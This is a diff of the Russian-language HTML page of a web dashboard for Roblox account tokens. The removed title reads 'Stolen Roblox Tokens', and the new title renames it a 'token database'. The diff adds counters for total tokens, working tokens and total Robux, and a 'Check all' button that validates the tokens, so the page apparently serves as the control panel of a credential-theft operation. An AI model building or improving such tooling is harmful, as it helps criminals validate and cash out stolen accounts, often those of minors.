@@ -3,32 +3,50 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Украденные Токены Roblox</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="assets/style.css?v=9">
+  <title>База токенов Roblox</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="assets/style.css?v=10">
 </head>
 <body>
 
   <div id="headerSlot"></div>
 
   <div class="container">
-    <div class="controls">
-      <h2 style="font-size:1.4rem; font-weight:800; letter-spacing:-0.5px;">База токенов</h2>
-      <div style="display: flex; gap: 0.5rem; align-items: center;">
-        <button class="sort-btn active" id="btnSortDate">По новизне</button>
-        <button class="sort-btn" id="btnSortRobux">По Robux</button>
+    <!-- Stats -->
+    <div class="stats-bar" style="padding:0; margin-bottom:1.5rem;">
+      <div class="stat-card">
+        <div class="stat-label">Всего токенов</div>
+        <div class="stat-value accent" id="sTotal">—</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-label">Рабочих</div>
+        <div class="stat-value success" id="sValid">—</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-label">Общий Robux</div>
+        <div class="stat-value gold" id="sTotalRobux">—</div>
       </div>
     </div>
-    
-    <div id="tokensContainer" class="tokens-grid">
+
+    <!-- Controls -->
+    <div class="controls" style="display:flex; gap:1rem; align-items:center; justify-content:space-between; margin-bottom:1.5rem; flex-wrap:wrap;">
+      <div style="display:flex; gap:0.5rem;">
+        <button class="sort-btn active" id="btnSortDate">📅 По дате</button>
+        <button class="sort-btn" id="btnSortRobux">💰 По Robux</button>
+      </div>
+      <button class="btn-refresh" id="btnCheckAll" style="border-color:var(--success); color:var(--success);">✓ Проверить все</button>
+    </div>
+
+    <!-- Tokens list -->
+    <div id="tokensContainer">
       <div class="loading">Загрузка токенов...</div>
     </div>
   </div>
 
   <div id="toast"></div>
 
-  <script src="assets/config.js?v=9"></script>
-  <script src="assets/app.js?v=9"></script>
-  <script src="assets/tokens.js?v=9"></script>
+  <script src="assets/config.js?v=10"></script>
+  <script src="assets/app.js?v=10"></script>
+  <script src="assets/tokens.js?v=10"></script>
 </body>
 </html>
